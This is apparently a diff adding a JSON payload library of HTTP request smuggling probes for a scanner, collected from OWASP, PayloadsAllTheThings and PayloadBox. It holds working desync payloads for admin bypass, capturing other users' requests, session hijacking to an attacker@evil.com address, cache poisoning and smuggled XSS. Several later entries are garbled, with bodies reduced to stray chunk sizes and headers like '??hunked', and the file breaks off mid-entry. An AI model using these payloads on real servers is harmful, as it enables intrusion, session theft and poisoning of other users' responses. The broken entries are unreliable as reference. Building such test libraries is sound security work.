@@ -1,0 +1,5299 @@
+[
+  {
+    "name": "CL.TE",
+    "description": "Classic Content-Length / Transfer-Encoding desync. Front-end uses Content-Length, back-end uses Transfer-Encoding. Body: chunked terminator (0\\r\\n\\r\\n) + smuggled prefix HELLO.",
+    "headers": {
+      "Content-Length": "10",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nHELLO",
+    "sourceType": "Manual",
+    "sourceFile": "N/A"
+  },
+  {
+    "name": "CL.TE Timing (Detect)",
+    "description": "Timing probe for CL.TE desync. Front-end reads Content-Length: 4 and forwards 1\\r\\nA\\r\\n. Back-end reads Transfer-Encoding: chunked, processes chunk '1' (body=A), then sees 'X' as an incomplete next chunk and HANGS waiting \u2014 response delay confirms CL.TE.",
+    "headers": {
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "1\\r\\nA\\r\\nX",
+    "sourceType": "Manual",
+    "sourceFile": "N/A"
+  },
+  {
+    "name": "TE.CL Timing (Detect)",
+    "description": "Timing probe for TE.CL desync. Front-end reads Transfer-Encoding: chunked, processes 0\\r\\n\\r\\n as end-of-stream and stops. Back-end reads Content-Length: 6, receives 5 bytes (0\\r\\n\\r\\n) and HANGS waiting for the 6th byte (X) \u2014 response delay confirms TE.CL.",
+    "headers": {
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nX",
+    "sourceType": "Manual",
+    "sourceFile": "N/A"
+  },
+  {
+    "name": "CL.TE (Content-Length vs Transfer-Encoding) (Variant 1)",
+    "description": "OWASP HTTP Request Smuggling probe (HTTP Request Smuggling Payloads | CL.TE (Content-Length vs Transfer-Encoding) | Front-end uses Content-Length, back-end uses Transfer-Encoding). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "13",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "CL.TE (Content-Length vs Transfer-Encoding) (Variant 2)",
+    "description": "OWASP HTTP Request Smuggling probe (CL.TE (Content-Length vs Transfer-Encoding)). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nG",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "CL.TE (Content-Length vs Transfer-Encoding) (Variant 3)",
+    "description": "OWASP HTTP Request Smuggling probe (CL.TE (Content-Length vs Transfer-Encoding)). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "5c\\r\\nGPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "TE.CL (Transfer-Encoding vs Content-Length) (Variant 4)",
+    "description": "OWASP HTTP Request Smuggling probe (TE.CL (Transfer-Encoding vs Content-Length) | Front-end uses Transfer-Encoding, back-end uses Content-Length). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "3",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "8\\r\\nSMUGGLED\\r\\n0",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "TE.CL (Transfer-Encoding vs Content-Length) (Variant 5)",
+    "description": "OWASP HTTP Request Smuggling probe (TE.CL (Transfer-Encoding vs Content-Length)). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "5e\\r\\nPOST /admin HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 10\\r\\n\\r\\nx=\\r\\n0",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "TE.TE (Transfer-Encoding obfuscation) (Variant 6)",
+    "description": "OWASP HTTP Request Smuggling probe (TE.TE (Transfer-Encoding obfuscation) | Both servers handle Transfer-Encoding but one can be obfuscated). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "cow"
+    },
+    "body": "5c\\r\\nGPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "TE.TE (Transfer-Encoding obfuscation) (Variant 7)",
+    "description": "OWASP HTTP Request Smuggling probe (TE.TE (Transfer-Encoding obfuscation)). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "x"
+    },
+    "body": "5c\\r\\nGPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Transfer-Encoding obfuscation variants (Variant 8)",
+    "description": "OWASP HTTP Request Smuggling probe (Transfer-Encoding obfuscation variants | CL.CL (Duplicate Content-Length)). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Transfer-Encoding": "chun\\x0bked",
+      "Transfer-encoding": "chunked",
+      "[space]Transfer-Encoding": "chunked",
+      "Transfer-Encoding[space]": "chunked"
+    },
+    "body": "POST / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 8\\r\\nContent-Length: 7\\r\\n\\r\\n12345\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Transfer-Encoding obfuscation variants (Variant 9)",
+    "description": "OWASP HTTP Request Smuggling probe (Transfer-Encoding obfuscation variants). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "9"
+    },
+    "body": "test=1\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Cache poisoning via request smuggling (Variant 10)",
+    "description": "OWASP HTTP Request Smuggling probe (Cache poisoning via request smuggling). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "130",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nGET /static/script.js HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 10\\r\\n\\r\\nx=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Bypassing front-end security controls (Variant 11)",
+    "description": "OWASP HTTP Request Smuggling probe (Bypassing front-end security controls). Target request line: POST /login HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "100",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nContent-Length: 10\\r\\n\\r\\nx=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Capturing other users' requests (Variant 12)",
+    "description": "OWASP HTTP Request Smuggling probe (Capturing other users' requests). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "230",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nPOST /log HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 1000\\r\\n\\r\\ncomment=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "XSS via request smuggling (Variant 13)",
+    "description": "OWASP HTTP Request Smuggling probe (XSS via request smuggling). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "150",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nGET /search?q=<script>alert(1)</script> HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 10\\r\\n\\r\\nx=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Web cache deception (Variant 14)",
+    "description": "OWASP HTTP Request Smuggling probe (Web cache deception). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "180",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nGET /static/include.js HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nX-Ignore: X\\r\\n\\r\\nGET /account HTTP/1.1\\r\\nHost: vulnerable-website.com",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Exploiting different chunk handling (Variant 15)",
+    "description": "OWASP HTTP Request Smuggling probe (Exploiting different chunk handling). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "96\\r\\nPOST /admin HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 30\\r\\n\\r\\ncsrf=token&action=delete\\r\\n0",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Timing-based detection payload (Variant 16)",
+    "description": "OWASP HTTP Request Smuggling probe (Timing-based detection payload). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "1\\r\\nZ\\r\\nQ",
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "http-request-smuggling-payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Header injection for smuggling (Variant 17)",
+    "description": "OWASP HTTP Request Smuggling probe (Header injection for smuggling). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "200",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nX-Forwarded-Host: evil.com\\r\\nContent-Length: 10\\r\\n\\r\\nx=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Session hijacking (Variant 18)",
+    "description": "OWASP HTTP Request Smuggling probe (Session hijacking). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "250",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nPOST /account/update HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 150\\r\\n\\r\\nemail=attacker@evil.com&session=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Smuggling with newlines (Variant 19)",
+    "description": "OWASP HTTP Request Smuggling probe (Smuggling with newlines). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "",
+      "Content-Length": "4"
+    },
+    "body": "5c\\r\\nSMUGGLED\\r\\n0",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Smuggling with tabs (Variant 20)",
+    "description": "OWASP HTTP Request Smuggling probe (Smuggling with tabs). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "5c\\r\\nSMUGGLED\\r\\n0",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "HTTP/2 downgrade smuggling (Variant 21)",
+    "description": "OWASP HTTP Request Smuggling probe (HTTP/2 downgrade smuggling). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Chunk size obfuscation (Variant 22)",
+    "description": "OWASP HTTP Request Smuggling probe (Chunk size obfuscation). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0000000000000000000a\\r\\nSMUGGLED123\\r\\n0",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Negative Content-Length (Variant 23)",
+    "description": "OWASP HTTP Request Smuggling probe (Negative Content-Length). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "-1",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Very large Content-Length (Variant 24)",
+    "description": "OWASP HTTP Request Smuggling probe (Very large Content-Length). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "999999999",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Mixed line endings (Variant 25)",
+    "description": "OWASP HTTP Request Smuggling probe (Mixed line endings). Target request line: POST / HTTP/1.1\\r\\n.",
+    "headers": {
+      "Host": "vulnerable-website.com\\r\\n",
+      "Content-Length": "4\\r\\n",
+      "Transfer-Encoding": "chunked\\n"
+    },
+    "body": "",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Unicode in headers (Variant 26)",
+    "description": "OWASP HTTP Request Smuggling probe (Unicode in headers). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Transfer\u2010Encoding": "identity"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Multiple Host headers (Variant 27)",
+    "description": "OWASP HTTP Request Smuggling probe (Multiple Host headers). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "evil.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Smuggling to internal endpoints (Variant 28)",
+    "description": "OWASP HTTP Request Smuggling probe (Smuggling to internal endpoints). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "150",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nGET /internal/admin HTTP/1.1\\r\\nHost: localhost\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nContent-Length: 10\\r\\n\\r\\nx=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Cookie injection via smuggling (Variant 29)",
+    "description": "OWASP HTTP Request Smuggling probe (Cookie injection via smuggling). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "180",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nCookie: session=stolen_session_here\\r\\nContent-Length: 10\\r\\n\\r\\nx=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Authorization bypass (Variant 30)",
+    "description": "OWASP HTTP Request Smuggling probe (Authorization bypass). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "200",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nAuthorization: Bearer admin_token_here\\r\\nContent-Length: 10\\r\\n\\r\\nx=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "CRLF injection in chunks (Variant 31)",
+    "description": "OWASP HTTP Request Smuggling probe (CRLF injection in chunks). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\n\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\n\\r\\nHost: vulnerable-website.com\\r\\n\\r\\n\\r\\n",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Smuggling via Content-Type (Variant 32)",
+    "description": "OWASP HTTP Request Smuggling probe (Smuggling via Content-Type). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Request line injection (Variant 33)",
+    "description": "OWASP HTTP Request Smuggling probe (Request line injection). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "150",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nGPOST /admin HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 10\\r\\n\\r\\nx=",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "Protocol smuggling (HTTP/1.1 -> HTTP/2) (Variant 34)",
+    "description": "OWASP HTTP Request Smuggling probe (Protocol smuggling (HTTP/1.1 -> HTTP/2)). Target request line: POST / HTTP/1.1.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Upgrade": "h2c",
+      "Connection": "Upgrade, HTTP2-Settings",
+      "HTTP2-Settings": "AAMAAABkAAQAAP__",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLED",
+    "sourceType": "OWASP",
+    "sourceFile": "http-request-smuggling-payloads.txt"
+  },
+  {
+    "name": "PayloadsAllTheThings CL.TE Standard Desync",
+    "description": "PayloadsAllTheThings CL.TE desync where front-end uses Content-Length and back-end uses Transfer-Encoding.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "13",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nSMUGGLED",
+    "sourceType": "PayloadsAllTheThings, PayloadBox",
+    "sourceFile": "README.md, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "PayloadsAllTheThings TE.CL Standard Desync",
+    "description": "PayloadsAllTheThings TE.CL desync where front-end uses Transfer-Encoding and back-end uses Content-Length.",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "3",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "8\\r\\nSMUGGLED\\r\\n0",
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "README.md"
+  },
+  {
+    "name": "PayloadsAllTheThings TE.CL GPOST Prefix Desync",
+    "description": "PayloadsAllTheThings TE.CL desync with GPOST prefix to poison subsequent client requests.",
+    "headers": {
+      "Host": "domain.example.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "body": "5c\\r\\nGPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0",
+    "sourceType": "PayloadsAllTheThings",
+    "sourceFile": "README.md"
+  },
+  {
+    "name": "Advanced Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "x"
+    },
+    "body": "46",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Detection-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /detection HTTP/1.1",
+    "headers": {
+      "X-Smuggle-Test": "probe"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Detection-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "150",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /admin/delete?username=carlos HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "10"
+    },
+    "body": "x=",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #5",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "54\\r\\n{\"method\":\"GET\",\"path\":\"/admin\",\"headers\":{\"Host\":\"localhost\"}}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #6",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked",
+      "X": "X[\\n]Transfer-Encoding: chunked"
+    },
+    "body": "6e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #7",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: DELETE /admin/user?id=1 HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #8",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked;x=y"
+    },
+    "body": "78\\r\\nPATCH /settings HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Type: application/json\\r\\nContent-Length: 15\\r\\n\\r\\n{\"admin\":true}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #9",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked",
+      "[space]Transfer-Encoding": "chunked"
+    },
+    "body": "7a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #10",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /admin/console HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "Content-Length": "10"
+    },
+    "body": "x=1\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #11",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "x, chunked"
+    },
+    "body": "a1",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #12",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: PUT /api/users/1 HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "25"
+    },
+    "body": "{\"role\":\"admin\",\"id\":1}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #13",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "??hunked"
+    },
+    "body": "54",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #14",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Bypass-Payloads.txt, Detection-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #15",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "ch??nked"
+    },
+    "body": "6a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #16",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /internal HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #17",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked\\x0b"
+    },
+    "body": "8f",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #18",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST /api/data HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "15"
+    },
+    "body": "{\"data\":\"test\"}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #19",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "87",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #20",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST /search HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "11"
+    },
+    "body": "q=smuggling\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #21",
